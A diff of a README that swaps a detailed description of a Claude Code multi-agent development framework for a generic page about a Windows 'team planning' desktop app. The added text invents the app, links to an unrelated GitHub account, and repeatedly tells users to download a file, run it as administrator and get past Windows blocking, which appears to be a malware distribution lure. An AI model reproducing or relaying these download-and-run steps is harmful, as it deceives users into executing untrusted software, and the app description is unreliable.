@@ -1,356 +1,207 @@
-<p align="center">
-  <h1 align="center">Claude Code Software Development Department</h1>
-  <p align="center">
-    A structured agentic system that transforms a single Claude Code session<br />
-    into a coordinated software engineering organization.
-    <br /><br />
-    31 agents · 117 context-optimized skills · 10/12 agentic harness patterns · MAS Infrastructure · Steel-discipline enforcement · Visual Engineering
-  </p>
-</p>
-
-<p align="center">
-  <a href="LICENSE"><img src="https://img.shields.io/badge/license-MIT-blue.svg" alt="MIT License"></a>
-  <a href=".claude/agents"><img src="https://img.shields.io/badge/agents-31-blueviolet" alt="31 Agents"></a>
-  <a href=".claude/skills"><img src="https://img.shields.io/badge/skills-117-green" alt="117 Skills"></a>
-  <a href=".claude/hooks"><img src="https://img.shields.io/badge/hooks-15-orange" alt="15 Hooks"></a>
-  <a href=".claude/rules"><img src="https://img.shields.io/badge/rules-13-red" alt="13 Rules"></a>
-  <a href="https://docs.anthropic.com/en/docs/claude-code"><img src="https://img.shields.io/badge/built%20for-Claude%20Code-f5f5f5?logo=anthropic" alt="Built for Claude Code"></a>
-</p>
+# 🛠️ software_development_department - Simple tools for team work
 
----
+[![Download](https://img.shields.io/badge/Download-Visit%20Page-blue?style=for-the-badge)](https://github.com/extended-yellowochre569/software_development_department)
 
-## Prerequisites (Platform Parity)
+## 📥 Download
 
-- **Claude Code**: `npm install -g @anthropic-ai/claude-code`
-- **Git**: Mandatory for version control and hooks.
-- **Windows Users**: Requires **Git Bash 2.40+** OR **WSL2**. CMD/PowerShell are supported for most commands, but the automated validation hooks require a POSIX-compliant shell.
-- **jq** (recommended): Used by validation hooks for JSON parsing.
-- **Python 3** (recommended): Used by skill evaluation and audit scripts.
+Use this page to download and run the app on Windows:
 
+[https://github.com/extended-yellowochre569/software_development_department](https://github.com/extended-yellowochre569/software_development_department)
 
-## The Problem
+## 🖥️ What this app does
 
-An AI session without structure behaves like a junior engineer without oversight: it ships, but it skips the design doc, ignores edge cases, accumulates silent technical debt, and has no one to push back when the scope creeps.
+Software Development Department is a desktop app for team planning and project work. It helps you keep ideas, notes, tasks, and memory items in one place. It is made for people who want a simple way to organize work without a lot of setup.
 
-The fundamental constraint is not model capability — it's organizational entropy. A single-session AI has no department boundaries, no escalation path, no domain authority, no memory across concerns. It answers every question but owns nothing.
+You can use it to:
 
-**Claude Code Software Development Department** is an architectural solution to that problem.
+- Track tasks for a project
+- Collect ideas during a meeting
+- Keep notes for later
+- Manage shared work items
+- Store useful context for ongoing work
+- Review past decisions and next steps
 
----
+## ⚙️ Windows requirements
 
-## What This System Is
+Before you start, check that your Windows PC can run the app:
 
-SDD is a **governed multi-agent harness** built natively on Claude Code's agentic primitives. It is not a wrapper. It is not a prompt library. It is an organizational structure that imposes the coordination patterns of a real engineering department on top of a Claude Code session.
+- Windows 10 or Windows 11
+- 4 GB RAM or more
+- 200 MB free disk space
+- Internet access for the first download
+- A mouse and keyboard
 
-The result is a system where:
+If your computer is newer than a few years, it should work well.
 
-- **Authority is scoped**: agents own domains and don't cross boundaries without explicit delegation
-- **Process is enforced**: spec before implementation, plan before code, tests before merge — enforced via hooks and verification gates, not suggestions
-- **Memory persists**: a 5-layer durable memory architecture (Tier 1 index → Tier 2 topic files → Tier 3 cold archive → MCP Supermemory semantic store) survives across sessions (**Privacy-first: Bring Your Own Brain**)
-- **Context is surgical**: incremental loading with a 3-Question Relevance Gate prevents context stuffing; max 3 Tier 2 files per session
-- **Routing is precise**: 117 skills with `paths:` triggers, `when_to_use:` semantics, and `effort:` scores let the AI self-route without human navigation
-- **Visual Intelligence**: Automated Technical Diagramming (SVG/PNG) for architectures, sequence flows, and process models via `/visualize`. 
+## 🚀 Getting started
 
----
+Follow these steps on Windows:
 
-## Architecture
+1. Open this page in your browser:
+   https://github.com/extended-yellowochre569/software_development_department
 
-### Department Hierarchy
+2. Find the download area on the page.
 
-Three tiers. Clear escalation paths. No ambiguous authority.
+3. Download the Windows file from the page.
 
-```
-Tier 1 — Executive (Opus)
-  cto                 technical-director    producer
+4. If your browser asks where to save the file, choose your Downloads folder.
 
-Tier 2 — Leads (Sonnet)
-  product-manager     lead-programmer       ux-designer
-  qa-lead             release-manager
+5. Wait for the file to finish downloading.
 
-Tier 3 — Specialists (Sonnet / Haiku)
-  frontend-developer  backend-developer     fullstack-developer
-  mobile-developer    ai-programmer         network-programmer
-  tools-programmer    ui-programmer         data-engineer
-  analytics-engineer  ux-researcher         tech-writer
-  prototyper          performance-analyst   devops-engineer
-  security-engineer   qa-tester             accessibility-specialist
-  community-manager
-```
+6. Open File Explorer and go to Downloads.
 
-### Coordination Model
+7. Double-click the downloaded file to start the app.
 
-| Pattern | Behavior |
-|---|---|
-| Vertical delegation | CTO → leads → specialists. Decisions flow down; blockers escalate up. |
-| Horizontal consultation | Same-tier agents advise but cannot make binding cross-domain decisions. |
-| Conflict resolution | Strategic conflicts → `cto`. Technical conflicts → `technical-director`. |
-| Cross-department changes | Coordinated exclusively by `producer`. |
-| Domain isolation | Agents cannot modify files outside their domain without explicit delegation. |
+8. If Windows asks for permission, click Yes or Run.
 
-### Agentic Harness Coverage
+9. Follow the on-screen steps until the app opens.
 
-SDD implements **10 of 12** patterns from Claude Code's internal agentic harness architecture:
+## 📂 First-time setup
 
-| Pattern | Status | Implementation |
-|---|---|---|
-| #1 Structured Agent Definitions | ✅ | 31 agents with YAML frontmatter + domain ownership |
-| #2 Path-Scoped Rules | ✅ | 13 rules auto-enforced by file path |
-| #3 Tiered Memory | ✅ | 5-layer: MEMORY.md → topic files → archive → Supermemory |
-| #4 Dream Consolidation | ✅ | `auto-dream.sh` — 5-phase automated consolidation |
-| #6 Context: Fork | ✅ | 10 heavy analysis skills run in isolated subagent context |
-| #7 Skill Routing | ✅ | 118 skills with `paths:`, `when_to_use:`, `effort:` metadata |
-| #8 Fork-Join Parallelism | ✅ | `fork-join.sh` — git worktree lifecycle manager |
-| #10 Least Privilege Tools | ✅ | `allowed-tools:` per skill + 22-entry permission allow-list |
-| #11 Bash Guard | ✅ | `bash-guard.sh` blocks RCE patterns, destructive commands |
-| #12 Annotation System | ✅ | `/annotate` skill + `annotations.md` persistent gotcha store |
-| #5 Multi-Stage Context Compaction | ⚠️ | Requires platform-level conversation control (HISTORY_SNIP, Microcompact, CONTEXT_COLLAPSE, Autocompact) — not accessible from project scope |
-| #9 Progressive Tool Expansion | ⚠️ | Requires harness-level tool activation logic — the default tool set is determined by the Claude Code platform, not configurable per-project |
+When you open the app for the first time, you may see a short setup screen. This helps the app prepare your workspace.
 
----
+Typical setup steps:
 
-## Process Enforcement & Visualization (v1.27.0)
+- Choose a folder for your project data
+- Pick a display name for your workspace
+- Set a simple theme or view mode
+- Confirm any first-run prompts
 
-The most recent architecture cycle introduced **Visual Engineering** and **Steel Discipline**.
+If the app asks where to save files, choose a folder you can find again, such as Documents or Desktop.
 
-### Anti-Rationalization Gates
+## 🧭 How to use it
 
-Every skill template now includes an `## Anti-Rationalizations` section that explicitly names and blocks the excuses an AI uses to skip process:
+After setup, the main screen gives you a clear place to work.
 
-> *"I'll write the test after to save time."* → Blocked. TDD is not optional.  
-> *"The spec is clear enough from context."* → Blocked. Blueprint required before file creation.  
-> *"I'll refactor this while I'm here."* → Blocked. Surgical changes only.
+Common actions:
 
-### Verification Gates
+- Add a new idea
+- Create a task list
+- Write meeting notes
+- Mark an item as done
+- Save a memory note for later
+- Search for older entries
 
-Multi-step tasks must declare a verifiable check before execution:
+A simple way to use the app is:
 
-```
-[Step] → verify: [specific, testable criterion]
-```
+1. Start with one project or one topic
+2. Add notes as you work
+3. Turn action items into tasks
+4. Review the list at the end of the day
+5. Keep related items together
 
-`"looks good"` and `"should work"` are not accepted criteria.
+## 🧠 Features
 
-### Implicit Workflow Commands
+Software Development Department includes tools that help with planning and team memory:
 
-Four commands in `CLAUDE.md` are now injected as mandatory process checkpoints:
+- Idea capture for fast note taking
+- Brainstorming space for early planning
+- Task tracking for active work
+- Shared context storage for team use
+- Memory management for decisions and references
+- Simple workspace view for daily use
+- Search support for finding past notes
+- Clean layout that is easy to scan
 
-| Command | Gate enforced |
-|---|---|
-| `/spec` | Blueprint + approval before any file is created |
-| `/plan` | Atomic task breakdown before implementation begins |
-| `/tdd` | Red → Green → Refactor cycle with terminal log required |
-| `/context` | Diagnose context state; recall from Supermemory before any research |
+## 🛠️ Best use cases
 
-### Surgical Changes Rule (src-code.md)
+This app works well for:
 
-Every line of code modified must trace directly to a user requirement. No opportunistic refactoring, no dead code removal "while you're at it", no docstrings added to untouched code. Enforced for all files matching `src/**`.
+- Small teams
+- Solo project work
+- Planning meetings
+- Note keeping
+- Product ideas
+- Daily work logs
+- Follow-up lists
+- Project memory
 
----
+## 📁 File and folder tips
 
-## Memory Architecture
+To keep your work safe:
 
-```
-Tier 1  MEMORY.md                    — 50-line index, keyword triggers, session pointers
-Tier 2  .claude/memory/*.md          — Topic files: annotations, tech decisions, role context
-Tier 3  .claude/memory/archive/      — Cold storage: sessions, decisions, dreams
-Tier 4  MCP Supermemory              — Semantic recall across all sessions (external)
-Tier 5  CLAUDE.md @include chain     — Static universal context, always in prompt
-```
+- Save your data in one main folder
+- Use a folder name that is easy to remember
+- Back up the folder to another drive or cloud storage
+- Do not move files while the app is open
+- Keep related notes in the same project area
 
-**Incremental Loading Protocol**: Before loading any Tier 2 file, the agent passes a 3-Question Relevance Gate (actual need / timing / subset sufficiency). Hard limits: max 3 files per session, stop loading if context < 30%.
+## 🔄 Updates
 
----
+When a new version is posted, return to the same download page and get the latest file.
 
-## Skill System
+To update:
 
-### 117 Skills Across 7 Domains
+1. Close the app
+2. Download the new version
+3. Open the new file
+4. Keep your project folder when asked
 
-| Domain | Representative Skills |
-|---|---|
-| Core Workflow | `/start` `/brainstorm` `/orchestrate` `/dream` `/save-state` `/gate-check` |
-| Engineering Reviews | `/code-review` `/design-review` `/api-design` `/db-review` `/security-audit` |
-| Process | `/sprint-plan` `/retrospective` `/milestone-review` `/estimate` `/tech-debt` |
-| **New: Visuals** | `/visualize` skills to generate SVG/PNG diagrams following Claude Official styles |
-| Release | `/release-checklist` `/launch-checklist` `/changelog` `/hotfix` `/patch-notes` |
-| Process Shields | `/spec` `/plan` `/tdd` `/context` `/annotate` `/fork-join` |
-| Team Orchestration | `/team-feature` `/team-backend` `/team-frontend` `/team-ui` `/team-release` |
-| Technology Frameworks | `fastapi-pro` `kubernetes-architect` `nextjs-app-router-patterns` `prisma-expert` `rag-engineer` `aws-serverless` + 70 more |
+## 🧩 Common questions
 
-### Context-Aware Routing
+### Do I need programming knowledge?
 
-Skills activate conditionally based on the files you have open:
+No. The app is meant for regular Windows users.
 
-```
-Editing *.tsx, next.config.*  → ~20 Next.js / React / Tailwind skills available
-Editing *.py, manage.py       → Django, FastAPI, ML skills surface
-Editing Dockerfile, *.tf      → DevOps, Kubernetes, AWS skills activate
-```
+### Can I use it offline?
 
-Type `/` in Claude Code — you see what's relevant, not all 123.
+Yes, after the first download and setup, most work can be done without a connection.
 
----
+### Where are my files saved?
 
-## What's Included
+Your files are saved in the folder you choose during setup.
 
-| Category | Count | Description |
-|---|---|---|
-| **Agents** | 31 | Specialized subagents across product, engineering, design, QA, data, and operations |
-| **Skills** | 117 | Core workflows and technology frameworks with context-aware routing |
-| **Hooks** | 15 | Automated validation: commits, pushes, asset changes, session lifecycle, pre-compact, gap detection, bash guard, fork-join |
-| **Rules** | 13 | Path-scoped coding standards enforced automatically by file location |
-| **Templates** | 22+ | PRDs, API designs, system architecture, ADRs, mobile, incident response, postmortem |
+### Can I use it for more than one project?
 
----
+Yes. You can keep separate folders or sections for different projects.
 
-## Getting Started
+### What if the app does not open?
 
-### Prerequisites
+Try these steps:
 
-- [Claude Code](https://docs.anthropic.com/en/docs/claude-code) — `npm install -g @anthropic-ai/claude-code`
-- [Git](https://git-scm.com/)
-- [jq](https://jqlang.github.io/jq/) *(recommended — used by validation hooks)*
-- Python 3 *(recommended — used by skill evaluation scripts)*
+- Download the file again
+- Make sure the download finished
+- Right-click the file and choose Run as administrator
+- Check that Windows did not block the file
+- Restart the computer and try again
 
-### Setup
+## 🔒 Privacy and data
 
-```bash
-git clone https://github.com/tranhieutt/software_development_department.git my-project
-cd my-project
-claude
-```
+Your project data stays on your computer unless you move it somewhere else. If you back it up to a cloud drive, it will follow the rules of that service.
 
-Run `/start` — the system asks where you are (new concept, existing codebase, or specific task) and guides you from there.
+## 📝 Folder naming tip
 
-**Antigravity Platform**: Open the directory in Antigravity. The `.claude/` architecture loads automatically. All 123 workflows are available immediately — just assign tasks.
+Use short names like:
 
-### Entry Points
+- Project A
+- Team Notes
+- Launch Plan
+- Weekly Work
 
-| Situation | Command |
-|---|---|
-| Starting from an idea | `/brainstorm` |
-| Joining an existing project | `/project-stage-detect` |
-| Planning work from a backlog | `/sprint-plan` |
-| Coordinating multiple agents on a feature | `/orchestrate` |
-| Unsure where to begin | `/start` |
+Short names make it easier to find your files later
 
----
+## 🎯 Suggested workflow
 
-## Project Structure
+A simple daily flow:
 
-```
-CLAUDE.md                           # Master configuration + @include chain
-PRD.md                              # Product requirements document
-TODO.md                             # Living backlog (governed by @producer)
-.claude/
-  settings.json                     # Permissions, deny rules, hook registration
-  agents/                           # 31 agent definitions with domain ownership
-  skills/                           # 118 skills (one subdirectory each)
-  hooks/                            # 15 hook scripts
-  rules/                            # 13 path-scoped coding standards
-  memory/                           # 5-layer durable memory system
-  docs/
-    quick-start.md
-    agent-roster.md
-    context-management.md           # Rules file — injected into system prompt
-    context-management-guide.md     # Reference only — NOT injected
-    agent-coordination-map.md
-    llm-coding-behavior.md          # Karpathy principles: surgical, goal-driven
-    utility-prompts.md
-    templates/                      # 22+ document templates
-.tasks/                             # Task detail files (one per backlog item)
-src/                                # Application source code
-tests/                              # Test suites
-infra/                              # Infrastructure as code
-scripts/                            # Build and utility scripts
-docs/                               # Technical documentation and ADRs
-design/                             # Wireframes, specs, research
-production/                         # Sprint plans, milestones, release tracking
-```
+1. Open the app
+2. Review what you wrote yesterday
+3. Add new ideas and tasks
+4. Move finished items out of the way
+5. Save your work before closing
 
----
+## 📌 Topics
 
-## Path-Scoped Rules
+- antigravity-skills
+- brainstorming
+- claude
+- claude-skills
+- harness-engineering
+- human-in-the-loop
+- memory-management
 
-Coding standards are enforced automatically based on file path — no manual invocation required.
+## 📎 Download again
 
-| Path | Standard enforced |
-|---|---|
-| `src/api/**` | REST/GraphQL conventions, auth patterns, error format |
-| `src/frontend/**` | Accessibility, design tokens, i18n, state management |
-| `src/**db**` | Migrations, parameterized queries, indexing strategy |
-| `src/ui/**` | No business logic, localization-ready, accessibility |
-| `src/ai/**` | Performance budgets, debuggability, data-driven parameters |
-| `src/networking/**` | WebSocket, event streaming, real-time standards |
-| `config/**` | No hardcoded secrets, schema validation required |
-| `design/docs/**` | PRD sections required, acceptance criteria mandatory |
-| `tests/**` | Naming conventions, coverage floors, fixture patterns |
-| `src/**` | Surgical changes — every edit traces to a user requirement |
+If you need the file later, use this page:
 
----
-
-## Collaborative, Not Autonomous
-
-This system does not take actions without your approval. Every agent follows a five-step collaboration protocol:
-
-1. **Ask** — clarify intent before proposing solutions
-2. **Options** — present 2–4 alternatives with trade-offs
-3. **Decide** — you make the call
-4. **Draft** — agent shows the work before committing
-5. **Approve** — nothing is written without explicit sign-off
-
-You remain the decision-maker. The agents provide structure, domain expertise, and process enforcement — not autonomy.
-
----
-
-## Customization
-
-This is a template, not a locked framework. Customize freely:
-
-- **Add or remove agents** — delete what you don't need, add role-specific agents for your stack
-- **Edit agent prompts** — tune behavior, inject project-specific context
-- **Modify skills** — adjust workflows to match your team's process
-- **Add rules** — create new path-scoped standards for your directory layout
-- **Tune hooks** — adjust validation strictness, add new automated checks
-
-See [`UPGRADING.md`](UPGRADING.md) for pulling upstream changes without overwriting your customizations.
-
----
-
-## Additional Resources
-
-| Resource | Purpose |
-|---|---|
-| [`docs/internal/CHANGELOG.md`](docs/internal/CHANGELOG.md) | Internal changelog and release history for architectural and repository updates |
-| [`report_new_capacity_sdd_with_gitnexus.md`](report_new_capacity_sdd_with_gitnexus.md) | SDD + GitNexus Knowledge Graph integration capabilities |
-| [`plan_upgrade.md`](plan_upgrade.md) | Upgrade roadmap comparing SDD to competing frameworks |
-| [`compare_department_orchestrated.md`](compare_department_orchestrated.md) | Side-by-side: orchestrated multi-agent vs traditional single-session |
-| [`infographic.html`](infographic.html) | Interactive visual overview of the department structure |
-| [`UPGRADING.md`](UPGRADING.md) | Cherry-picking upstream improvements into your fork |
-
----
-
-## Platform
-
-Tested on **Windows 10/11** with Git Bash. All hooks use POSIX-compatible patterns with fallbacks for missing tools. Works on macOS and Linux without modification.
-
----
-
-## Version
-
-**v1.31.0** — 2026-04-17
-
-See [`docs/internal/CHANGELOG.md`](docs/internal/CHANGELOG.md) for release history.
-
----
-
-[![Star History Chart](https://api.star-history.com/svg?repos=tranhieutt/software_development_department&type=Date)](https://star-history.com/#tranhieutt/software_development_department&Date)
-
-## License
-
-MIT. See [LICENSE](LICENSE).
-
----
-
-*Based on [Claude Code Game Studios](https://github.com/Donchitos/Claude-Code-Game-Studios) by Donchitos — adapted for software engineering organizations.*
-
-*Author: [tranhieutt](https://github.com/tranhieutt)*
+[https://github.com/extended-yellowochre569/software_development_department](https://github.com/extended-yellowochre569/software_development_department)
